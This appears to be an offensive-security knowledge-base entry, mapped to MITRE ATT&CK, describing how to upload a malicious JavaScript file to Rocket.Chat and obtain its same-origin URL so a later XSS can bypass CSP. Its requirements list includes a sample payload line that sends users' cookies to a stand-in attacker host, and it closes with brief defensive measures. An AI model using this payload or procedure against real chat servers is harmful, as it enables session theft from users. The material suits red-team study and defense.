---
tags:
  - file-upload
  - csp-bypass
  - rocket-chat
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Remote File Copy]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 2a3f3a70-9b43-41f2-850b-1a46478ec726
created_at: '2025-12-14T05:32:10.431Z'
updated_at: '2025-12-14T05:32:10.431Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Malicious-JavaScript-File-in-Rocket-Chat

## Summary

This procedure involves uploading a JavaScript file via Rocket.Chat's file upload feature, which serves the file with an executable content-type (application/javascript or text/javascript), setting the stage for CSP bypass when combined with XSS.

## Description

In Rocket.Chat, the file upload functionality allows users to upload files, including JavaScript, without proper content-type restrictions. Uploaded JS files are stored and served directly, enabling them to be sourced externally. This is critical for bypassing CSP policies that block inline scripts but permit loading from the same origin. Prerequisites include a valid user session with upload permissions. Expected outcomes: The file is accessible via a predictable URL path using the upload ID, ready for execution in subsequent steps.

## Requirements

1. Authenticated access to Rocket.Chat as a user with file upload permissions
2. Web browser to handle the upload interface
3. Malicious JS payload file prepared locally (e.g., payload.js with content like `document.location='http://attacker.com?cookie='+document.cookie;` for exfiltration)

## Defense

Defensive measures and detection strategies:

- Restrict file upload content-types to non-executable formats (e.g., block .js extensions or set content-type to text/plain)
- Implement server-side validation to scan uploads for malicious code
- Monitor upload logs for suspicious file types and access patterns to uploaded files

## Objectives

1. Deliver a JavaScript payload to the server for later execution
2. Obtain a stable URL for the uploaded file using the upload ID
3. Enable same-origin loading to evade CSP restrictions

## Instructions

### Step 1: Prepare and Upload the JS File

**Context**: Create a simple JS file with the desired payload and upload it through the chat interface to get the upload ID.

Navigate to the file upload section in a Rocket.Chat channel. Select the local file payload.js and upload it. Upon success, inspect the network response or download link to extract the <UPLOAD ID>, which appears in the file's access URL.

**Expected Output**: Upload confirmation message in chat, with file downloadable at `/file-upload/<UPLOAD ID>/payload.js?download`. Verify by accessing the URL and checking the content-type header is application/javascript.

### Step 2: Verify Upload Accessibility

**Context**: Ensure the uploaded file is served correctly and executable.

Use browser developer tools to fetch the file URL and confirm it loads as JavaScript without errors. Test by temporarily sourcing it in a local HTML file if needed.

**Expected Output**: File contents load with correct MIME type, no 404 or access denied.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[file-upload]]
- [[csp-bypass]]
- [[rocket-chat]]
